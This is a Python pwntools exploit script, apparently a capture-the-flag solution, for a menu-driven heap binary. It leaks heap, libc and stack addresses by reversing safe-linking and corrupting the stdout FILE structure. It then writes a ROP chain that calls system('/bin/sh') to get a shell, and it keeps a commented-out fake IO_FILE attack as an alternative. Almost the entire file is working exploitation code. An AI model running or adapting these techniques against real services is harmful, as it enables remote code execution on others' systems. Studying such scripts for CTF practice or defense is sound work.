#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("/lib/x86_64-linux-gnu/libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def cmd(choice):
    ru(b"> ")
    sl(i2b(choice))


def edit(idx, data):
    cmd(1)
    ru(b"index: ")
    sl(i2b(idx))
    ru(b"msg: ")
    sl(data)


def show(idx):
    cmd(2)
    ru(b"index: ")
    sl(i2b(idx))
    ru(b"=== shadow msg ===\n")


def revese(key):
    key = key ^ ((key >> 12) & 0x000FFF000000)
    key = key ^ ((key >> 12) & 0x000000FFF000)
    key = key ^ ((key >> 12) & 0x000000000FFF)
    return key


# edit(1, b"a" * 0x18 + p32(0x81))
edit(1, p8(0x81))
show(2)
leak = ru(b"\n\n", drop=True)
assert len(leak) == 6
heap_base = revese(u64_ex(leak)) - 0x360
lg("heap_base", heap_base)

edit(0, flat({0x28: [heap_base + 0x2A0]}))
show(1)
libc_base = u64_ex(ru(b"\n\n", drop=True)) - 0x29D90
lg("libc_base", libc_base)

edit(0, flat({0x28: [heap_base + 0x420]}))
edit(
    1,
    flat([0x00, 0x21]),
)

edit(0, flat({0x28: [libc_base + 0x21B780]}))
edit(
    1,
    flat(
        [
            0xFBAD1887,
            0,
            0,
            0,
            libc_base + libc.sym.environ,
            libc_base + libc.sym.environ + 0x10,
            libc_base + libc.sym.environ + 0x10,
        ]
    ),
)
stack_base = u64_ex(rn(6)) - 0x1A0 + 0x60
lg("stack_base", stack_base)
pop_rdi_ret = libc_base + 0x000000000002A3E5

edit(0, flat({0x28: [stack_base]}))
edit(
    1,
    flat(
        [
            pop_rdi_ret,
            libc_base + next(libc.search(b"/bin/sh\x00")),
            pop_rdi_ret + 1,
            libc_base + libc.sym.system,
        ]
    ),
)

edit(0, flat({0x18: [0x21, pop_rdi_ret, heap_base + 0x430]}))
cmd(3)

# target_addr = libc_base + libc.sym._IO_list_all
# fake_IO_FILE = heap_base + 0x2000
# _IO_wfile_jumps = libc_base + libc.sym._IO_wfile_jumps
# _lock = libc_base + 0x21CA70
# f1 = IO_FILE_plus_struct()
# f1.flags = u64_ex("  sh;")
# f1._lock = _lock
# f1._wide_data = fake_IO_FILE + 0xE0
# # f1.vtable = _IO_wfile_jumps
# f1.vtable = 0xDEADBEEF
# data = flat(
#     {
#         0: bytes(f1),
#         0xE0: {  # _wide_data->_wide_vtable
#             0x18: 0,  # f->_wide_data->_IO_write_base
#             0x30: 0,  # f->_wide_data->_IO_buf_base
#             0xE0: fake_IO_FILE + 0x200,
#         },
#         0x200: {0x68: libc_base + libc.sym.system},
#     },
# )
#
# edit(0, flat({0x28: [heap_base + 0x2000]}))
# edit(1, data)
#
# edit(0, flat({0x28: [target_addr]}))
# edit(1, p64(fake_IO_FILE))

ia()
